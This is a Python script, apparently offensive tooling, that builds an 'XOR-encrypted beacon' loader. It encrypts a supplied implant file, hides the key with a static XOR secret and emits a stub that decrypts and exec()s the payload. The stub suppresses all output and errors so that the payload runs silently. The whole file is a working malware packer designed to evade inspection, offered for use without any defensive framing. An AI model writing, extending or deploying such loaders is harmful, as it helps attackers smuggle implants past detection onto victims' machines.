import argparse
import os

def xor_encrypt(data: bytes, key: str) -> bytes:
    key_bytes = key.encode()
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])

def xor_obfuscate(password: str, secret: str) -> bytes:
    secret_bytes = secret.encode()
    pw_bytes = password.encode()
    return bytes([b ^ secret_bytes[i % len(secret_bytes)] for i, b in enumerate(pw_bytes)])

def format_bytes_literal(data: bytes) -> str:
    return "b'" + ''.join([f'\\x{b:02x}' for b in data]) + "'"

XOR_EXECUTOR_TEMPLATE = '''import os
import sys
import subprocess
import contextlib

@contextlib.contextmanager
def suppress_output():
    with open(os.devnull, 'w') as fnull:
        original_stdout = sys.stdout
        original_stderr = sys.stderr
        sys.stdout = fnull
        sys.stderr = fnull
        try:
            yield
        finally:
            sys.stdout = original_stdout
            sys.stderr = original_stderr

keygen_secret = "{keygen_secret}"
obfuscated_password_bytes = {obfuscated_password_bytes}
encrypted_hex = "{encrypted_hex}"

def deobfuscate_password(secret: str, obf_bytes: bytes) -> str:
    secret_bytes = secret.encode()
    return bytes([b ^ secret_bytes[i % len(secret_bytes)] for i, b in enumerate(obf_bytes)]).decode()

def xor_decrypt_hex(hexdata, key):
    key_bytes = key.encode()
    encrypted = bytes.fromhex(hexdata)
    return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(encrypted)])

try:
    password = deobfuscate_password(keygen_secret, obfuscated_password_bytes)
    decrypted_code = xor_decrypt_hex(encrypted_hex, password).decode()
    with suppress_output():
        exec(decrypted_code, globals())
except Exception:
    pass
'''

def main():
    parser = argparse.ArgumentParser(description="XOR-encrypted Python Beacon Builder")
    parser.add_argument("beacon", help="Path to the Python beacon file")
    parser.add_argument("-p", "--password", required=True, help="Password for XOR encryption")
    parser.add_argument("-k", "--keygen-secret", default="janbskj", help="Static XOR secret for obfuscation")
    parser.add_argument("-o", "--output", default="build/beacon/xor_beacon.py", help="Output stub file")

    args = parser.parse_args()

    with open(args.beacon, "rb") as f:
        beacon_code = f.read()

    encrypted_bytes = xor_encrypt(beacon_code, args.password)
    encrypted_hex = encrypted_bytes.hex()

    obfuscated = xor_obfuscate(args.password, args.keygen_secret)
    obfuscated_literal = format_bytes_literal(obfuscated)

    stub = XOR_EXECUTOR_TEMPLATE.format(
        keygen_secret=args.keygen_secret,
        obfuscated_password_bytes=obfuscated_literal,
        encrypted_hex=encrypted_hex
    )

    os.makedirs(os.path.dirname(args.output), exist_ok=True)
    with open(args.output, "w") as f:
        f.write(stub)

    print(f"[+] XOR-encrypted beacon stub written to: {args.output}")

if __name__ == "__main__":
    main()

